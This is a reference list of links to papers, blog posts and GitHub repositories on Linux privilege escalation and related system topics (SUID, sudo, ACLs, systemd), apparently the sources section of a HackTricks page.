- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)


{{#include ../../banners/hacktricks-training.md}}
